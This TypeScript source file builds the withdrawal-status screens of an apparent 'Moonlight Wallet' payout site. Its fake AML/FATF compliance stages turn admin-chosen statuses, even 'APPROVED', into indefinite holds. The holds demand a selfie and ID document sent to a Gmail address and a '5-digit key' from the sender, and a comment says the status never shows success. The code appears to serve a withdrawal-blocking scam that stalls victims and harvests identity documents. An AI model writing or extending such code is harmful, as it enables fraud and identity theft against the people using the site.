/**
 * AML / FATF compliant terminology and 14-stage 168-hour timeline logic for Moonlight Wallet payouts.
 * Reference: FATF 40 Recommendations & EU AML/CFT directives.
 */

export interface ComplianceStage {
  stage: number;
  hourMin: number;
  hourMax: number;
  title: string;
  description: string;
}

export const WITHDRAWAL_COMPLIANCE_STAGES: ComplianceStage[] = [
  {
    stage: 1,
    hourMin: 0,
    hourMax: 12,
    title: "Payment Details Review",
    description: "Verifying withdrawal request parameters and payout destination format.",
  },
  {
    stage: 2,
    hourMin: 12,
    hourMax: 24,
    title: "Customer Due Diligence",
    description: "Standard identity verification and customer due diligence check.",
  },
  {
    stage: 3,
    hourMin: 24,
    hourMax: 36,
    title: "Beneficiary Verification",
    description: "Validating recipient account details, routing data and account status.",
  },
  {
    stage: 4,
    hourMin: 36,
    hourMax: 48,
    title: "Transaction Monitoring",
    description: "Screening transaction patterns against risk and fraud guidelines.",
  },
  {
    stage: 5,
    hourMin: 48,
    hourMax: 60,
    title: "Source of Funds Review",
    description: "Internal balance audit and source of funds assessment.",
  },
  {
    stage: 6,
    hourMin: 60,
    hourMax: 72,
    title: "Risk Assessment",
    description: "Compliance risk review for outbound transaction allocation.",
  },
  {
    stage: 7,
    hourMin: 72,
    hourMax: 84,
    title: "Cross-Border Processing",
    description: "Currency conversion verification and corridor fee validation.",
  },
  {
    stage: 8,
    hourMin: 84,
    hourMax: 96,
    title: "Payout Processing",
    description: "Confirming outbound channel readiness and settlement preparation.",
  },
  {
    stage: 9,
    hourMin: 96,
    hourMax: 108,
    title: "Enhanced Due Diligence",
    description: "Secondary risk review and periodic transaction audit.",
  },
  {
    stage: 10,
    hourMin: 108,
    hourMax: 120,
    title: "Compliance Review",
    description: "Balance verification and settlement queue indexing.",
  },
  {
    stage: 11,
    hourMin: 120,
    hourMax: 132,
    title: "Payout Queue",
    description: "Queued for disbursement authorization.",
  },
  {
    stage: 12,
    hourMin: 132,
    hourMax: 144,
    title: "Manual Review",
    description: "Administrative review and compliance checklist verification.",
  },
  {
    stage: 13,
    hourMin: 144,
    hourMax: 156,
    title: "Final Review",
    description: "Pre-release audit and beneficiary confirmation.",
  },
  {
    stage: 14,
    hourMin: 156,
    hourMax: 168,
    title: "Hold Window",
    description: "Final review stage prior to administrative release.",
  },
];

export function addBusinessDays(date: Date, days: number): Date {
  const result = new Date(date);
  let count = 0;
  while (count < days) {
    result.setDate(result.getDate() + 1);
    const day = result.getDay();
    if (day !== 0 && day !== 6) {
      count++;
    }
  }
  return result;
}

export function formatEstimatedArrival(createdAtStr: string): {
  rangeText: string;
  expectedDateText: string;
  daysText: string;
} {
  const createdDate = new Date(createdAtStr);
  const minDate = addBusinessDays(createdDate, 2);
  const maxDate = addBusinessDays(createdDate, 5);

  const monthNames = [
    "Jan", "Feb", "Mar", "Apr", "May", "Jun",
    "Jul", "Aug", "Sep", "Oct", "Nov", "Dec",
  ];

  const minMonth = monthNames[minDate.getMonth()];
  const minDay = minDate.getDate();
  const maxMonth = monthNames[maxDate.getMonth()];
  const maxDay = maxDate.getDate();
  const year = maxDate.getFullYear();

  const rangeText =
    minMonth === maxMonth
      ? `${minMonth} ${minDay}–${maxDay}, ${year}`
      : `${minMonth} ${minDay} – ${maxMonth} ${maxDay}, ${year}`;

  return {
    rangeText,
    expectedDateText: `Expected ${rangeText} (2–5 business days)`,
    daysText: "2–5 business days",
  };
}

export const TIMELINE_SUMMARY_STEPS = [
  { stepNum: 1, label: "Request submitted & ledger verification", timeWindow: "Day 1" },
  { stepNum: 2, label: "Interbank clearance & switch routing", timeWindow: "Days 2–3" },
  { stepNum: 3, label: "Beneficiary bank inward credit (funds may arrive)", timeWindow: "Days 2–5" },
  { stepNum: 4, label: "Settlement clearance & compliance check", timeWindow: "Day 5" },
];

export const COMPLIANCE_KYC_EMAIL = "moonlightwealthmanagement@gmail.com";

export interface WithdrawalComplianceResult {
  statusLabel: string;
  stageTitle: string;
  description: string;
  currentStep: string;
  currentStepDescription: string;
  nextStep: string;
  nextStepDescription: string;
  estimatedArrivalDate: string;
  estimatedDaysText: string;
  progressPercent: number;
  isProcessing: boolean;
  isHold: boolean;
  isKycRequired: boolean;
  /** Alias for isKycRequired — used by the KeyBox UI flow */
  isKeyBoxRequired: boolean;
  kycEmail: string;
  currentDayNumber: number;
  isSuccess: boolean;
  isFailed: boolean;
  stageNumber: number;
  totalStages: number;
  elapsedText: string;
  nextReviewHours: number;
}

export function getWithdrawalComplianceInfo(
  createdAtStr: string,
  dbStatus: string,
  options?: { isUPI?: boolean; method?: string; route?: string; keySubmitted?: boolean },
): WithdrawalComplianceResult {
  const createdDate = new Date(createdAtStr);
  const now = new Date();
  const elapsedMs = Math.max(0, now.getTime() - createdDate.getTime());
  const elapsedHours = elapsedMs / (1000 * 60 * 60);
  const totalMinutes = Math.floor(elapsedMs / (1000 * 60));
  const displayHours = Math.floor(totalMinutes / 60);
  const displayMinutes = totalMinutes % 60;
  const elapsedText = `${displayHours}h ${displayMinutes}m`;

  const arrival = formatEstimatedArrival(createdAtStr);
  const upperStatus = (dbStatus || "PROCESSING").toUpperCase();

  // If user has submitted the 5-digit verification key -> immediately turns back into PROCESSING
  if (options?.keySubmitted) {
    return {
      statusLabel: "PROCESSING",
      stageTitle: "Key Submitted — Interbank Verification & Processing",
      description:
        "Your 5-digit sender verification key has been received in this tab. Your payout has returned to processing while interbank clearing switches perform automated verification before final disbursement.",
      currentStep: "Key Submitted · Verification in Progress",
      currentStepDescription:
        "5-digit verification key received. Moonlight compliance and clearing switch are completing matching clearance.",
      nextStep: "Settlement & Fund Release",
      nextStepDescription:
        "Upon final clearance authorization, payout funds will be released directly without further verification.",
      estimatedArrivalDate: arrival.rangeText,
      estimatedDaysText: "Processing (Key Verifying)",
      progressPercent: 85,
      isProcessing: true,
      isHold: false,
      isKycRequired: false,
      isKeyBoxRequired: false,
      kycEmail: COMPLIANCE_KYC_EMAIL,
      currentDayNumber: 4,
      isSuccess: false,
      isFailed: false,
      stageNumber: 3,
      totalStages: 4,
      elapsedText,
      nextReviewHours: 0,
    };
  }

  const isKycHold =
    upperStatus === "ON HOLD" ||
    upperStatus === "HOLD" ||
    upperStatus === "KYC HOLD" ||
    upperStatus === "KYC REQUIRED" ||
    upperStatus === "ACTION REQUIRED";

  // Step 2: Explicit KYC Hold: Admin puts withdrawal on hold -> displays "KYC HOLD"
  if (isKycHold) {
    return {
      statusLabel: "KYC HOLD",
      stageTitle: "Payout On Hold — Identity Verification (KYC) Required",
      description:
        "Your withdrawal payout is currently on hold pending mandatory identity verification. In accordance with statutory financial regulations, please complete KYC verification (live selfie photo and matching ID document) so your payout can be approved.",
      currentStep: "Identity Verification (KYC) Required",
      currentStepDescription:
        "Outbound clearing could not be completed automatically. Please complete KYC identity verification with a live selfie and matching ID card so compliance can approve your payout.",
      nextStep: "Compliance Approval & 5-Digit Key Verification",
      nextStepDescription:
        "Upon review and approval of your KYC documents by Moonlight Compliance, you will be prompted to enter the 5-digit sender verification key to release the funds.",
      estimatedArrivalDate: arrival.rangeText,
      estimatedDaysText: "KYC Hold · Action Required",
      progressPercent: 40,
      isProcessing: false,
      isHold: true,
      isKycRequired: true,
      isKeyBoxRequired: false,
      kycEmail: COMPLIANCE_KYC_EMAIL,
      currentDayNumber: 2,
      isSuccess: false,
      isFailed: false,
      stageNumber: 2,
      totalStages: 4,
      elapsedText,
      nextReviewHours: 0,
    };
  }

  const isKeyHold =
    upperStatus === "UNDER REVIEW" ||
    upperStatus === "KEY NEEDED" ||
    upperStatus === "KEY HOLD" ||
    upperStatus === "KEY REQUIRED" ||
    upperStatus === "APPROVED";

  // Step 3: Admin Approves KYC -> 5-digit key hold: displays "KEY NEEDED" (never "Successful" or "Credited")
  if (isKeyHold) {
    return {
      statusLabel: "KEY NEEDED",
      stageTitle: "KYC Approved — 5-Digit Key Hold",
      description:
        "Your KYC identity verification has passed successfully. To release your payout funds to your account, you now need to enter the 5-digit KeyBox verification key provided by the sender on the website and in this withdrawal tab. You must inform the sender too to put the keys in their tab, or else it will not succeed. Once both keys are entered and verified, the money will be out for release without any extra verification.",
      currentStep: "KYC Approved · Enter 5-Digit Verification Key",
      currentStepDescription:
        "KYC verification is completed and approved. Please enter the verification key on the website and in this withdrawal tab. You must inform the sender too to put the keys in their tab, or else it will not succeed. When both keys are put and you have sent the correct key, the money will be out for release without any extra verification.",
      nextStep: "Disbursement & Instant Fund Release",
      nextStepDescription:
        "Funds will be released immediately to your destination account without any extra verification upon key matching.",
      estimatedArrivalDate: arrival.rangeText,
      estimatedDaysText: "Key Needed · Action Required",
      progressPercent: 75,
      isProcessing: false,
      isHold: true,
      isKycRequired: false,
      isKeyBoxRequired: true,
      kycEmail: COMPLIANCE_KYC_EMAIL,
      currentDayNumber: 3,
      isSuccess: false,
      isFailed: false,
      stageNumber: 3,
      totalStages: 4,
      elapsedText,
      nextReviewHours: 0,
    };
  }

  // Step 5: Finalized by admin: Completed / Settled (ONLY after final admin settlement approval)
  if (
    upperStatus === "SUCCESSFUL" ||
    upperStatus === "COMPLETED" ||
    upperStatus === "SUCCESS" ||
    upperStatus === "SETTLED"
  ) {
    return {
      statusLabel: "SUCCESS",
      stageTitle: "Payout Settled",
      description: "Withdrawal confirmed and funds dispatched to recipient account.",
      currentStep: "Dispatched & Credited",
      currentStepDescription: "Funds have been successfully dispatched and credited to the beneficiary account.",
      nextStep: "Transfer Completed",
      nextStepDescription: "The withdrawal has arrived at the receiving destination.",
      estimatedArrivalDate: "Completed",
      estimatedDaysText: "Settled",
      progressPercent: 100,
      isProcessing: false,
      isHold: false,
      isKycRequired: false,
      isKeyBoxRequired: false,
      kycEmail: COMPLIANCE_KYC_EMAIL,
      currentDayNumber: 5,
      isSuccess: true,
      isFailed: false,
      stageNumber: 4,
      totalStages: 4,
      elapsedText,
      nextReviewHours: 0,
    };
  }

  // Finalized: Failed or Rejected
  if (upperStatus === "FAILED" || upperStatus === "REJECTED") {
    return {
      statusLabel: "FAILED",
      stageTitle: "Withdrawal Cancelled",
      description: "Request stopped during review. Full funds returned to your Moonlight balance.",
      currentStep: "Transfer Cancelled",
      currentStepDescription: "Withdrawal halted. Amount has been restored to your available wallet balance.",
      nextStep: "None",
      nextStepDescription: "No further processing action required.",
      estimatedArrivalDate: "Cancelled",
      estimatedDaysText: "Refunded to Wallet",
      progressPercent: 0,
      isProcessing: false,
      isHold: false,
      isKycRequired: false,
      isKeyBoxRequired: false,
      kycEmail: COMPLIANCE_KYC_EMAIL,
      currentDayNumber: 0,
      isSuccess: false,
      isFailed: true,
      stageNumber: 0,
      totalStages: 4,
      elapsedText,
      nextReviewHours: 0,
    };
  }

  // Cancelled
  if (upperStatus === "CANCELLED") {
    return {
      statusLabel: "CANCELLED",
      stageTitle: "Request Cancelled",
      description: "Withdrawal was cancelled. Funds returned to your available balance.",
      currentStep: "Request Cancelled",
      currentStepDescription: "Request was cancelled. Funds returned to your Moonlight Wallet balance.",
      nextStep: "None",
      nextStepDescription: "No further action required.",
      estimatedArrivalDate: "Cancelled",
      estimatedDaysText: "Refunded to Wallet",
      progressPercent: 0,
      isProcessing: false,
      isHold: false,
      isKycRequired: false,
      isKeyBoxRequired: false,
      kycEmail: COMPLIANCE_KYC_EMAIL,
      currentDayNumber: 0,
      isSuccess: false,
      isFailed: true,
      stageNumber: 0,
      totalStages: 4,
      elapsedText,
      nextReviewHours: 0,
    };
  }

  // Active Processing within the 2–5 business days window (concludes Day 5):
  // Day 1 (0 to 24 hours): Submission & Internal Ledger Clearance
  if (elapsedHours < 24) {
    const nextWindow = Math.max(1, Math.ceil(24 - elapsedHours));
    return {
      statusLabel: "PROCESSING",
      stageTitle: "Payment Details & Ledger Review",
      description: "Verifying withdrawal request parameters and securing wallet ledger debit.",
      currentStep: "Payment Verification & Authorization",
      currentStepDescription:
        "Withdrawal authorized and registered in interbank clearance. Expected arrival: 2–5 business days (settlement concludes Day 5).",
      nextStep: "Interbank Rail Transmission",
      nextStepDescription: "Dispatch to the national payment clearance network.",
      estimatedArrivalDate: arrival.rangeText,
      estimatedDaysText: arrival.daysText,
      progressPercent: 25,
      isProcessing: true,
      isHold: false,
      isKycRequired: false,
      isKeyBoxRequired: false,
      kycEmail: COMPLIANCE_KYC_EMAIL,
      currentDayNumber: 1,
      isSuccess: false,
      isFailed: false,
      stageNumber: 1,
      totalStages: 4,
      elapsedText,
      nextReviewHours: nextWindow,
    };
  }

  // Days 2–3 (24 to 72 hours): Interbank Clearance & Transmission
  if (elapsedHours < 72) {
    const nextWindow = Math.max(1, Math.ceil(72 - elapsedHours));
    const dayNum = elapsedHours < 48 ? 2 : 3;
    return {
      statusLabel: "PROCESSING",
      stageTitle: "Interbank Clearance & Routing",
      description: "Routing through national payment settlement switch to beneficiary institution.",
      currentStep: "Interbank Clearance & Transmission",
      currentStepDescription:
        "Transaction is in transit through the payment clearing network. Beneficiary credit may reflect anytime between Days 2–5.",
      nextStep: "Beneficiary Bank Inward Verification",
      nextStepDescription: "Recipient bank verifying destination account credentials.",
      estimatedArrivalDate: arrival.rangeText,
      estimatedDaysText: arrival.daysText,
      progressPercent: 50,
      isProcessing: true,
      isHold: false,
      isKycRequired: false,
      isKeyBoxRequired: false,
      kycEmail: COMPLIANCE_KYC_EMAIL,
      currentDayNumber: dayNum,
      isSuccess: false,
      isFailed: false,
      stageNumber: 2,
      totalStages: 4,
      elapsedText,
      nextReviewHours: nextWindow,
    };
  }

  // Days 4–5 (72 to 120 hours): Beneficiary Bank Inward Processing
  const nextWindow = Math.max(1, Math.ceil(120 - elapsedHours));
  const dayNum = elapsedHours < 96 ? 4 : 5;
  return {
    statusLabel: "PROCESSING",
    stageTitle: "Beneficiary Bank Processing",
    description: "Transferred to recipient banking institution for inward ledger allocation.",
    currentStep: "Beneficiary Bank Processing & Inward Audit",
    currentStepDescription:
      "Funds routed to destination banking network. Final interbank clearance cycle concludes on Day 5.",
    nextStep: "Account Statement Posting & Settlement",
    nextStepDescription: "Final account balance credit by beneficiary institution.",
    estimatedArrivalDate: arrival.rangeText,
    estimatedDaysText: arrival.daysText,
    progressPercent: 75,
    isProcessing: true,
    isHold: false,
    isKycRequired: false,
    isKeyBoxRequired: false,
    kycEmail: COMPLIANCE_KYC_EMAIL,
    currentDayNumber: dayNum,
    isSuccess: false,
    isFailed: false,
    stageNumber: 3,
    totalStages: 4,
    elapsedText,
    nextReviewHours: nextWindow,
  };
}

export function groupByPeriod<T extends { created_at: string }>(items: T[]) {
  const now = new Date();
  const startToday = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
  const startWeek = startToday - 6 * 86400000;
  const startMonth = new Date(now.getFullYear(), now.getMonth(), 1).getTime();
  const groups: { label: string; items: T[] }[] = [
    { label: "Today", items: [] },
    { label: "This week", items: [] },
    { label: "This month", items: [] },
    { label: "Earlier", items: [] },
  ];
  for (const t of items) {
    const ts = new Date(t.created_at).getTime();
    const g = ts >= startToday ? 0 : ts >= startWeek ? 1 : ts >= startMonth ? 2 : 3;
    groups[g]!.items.push(t);
  }
  return groups.filter((g) => g.items.length);
}
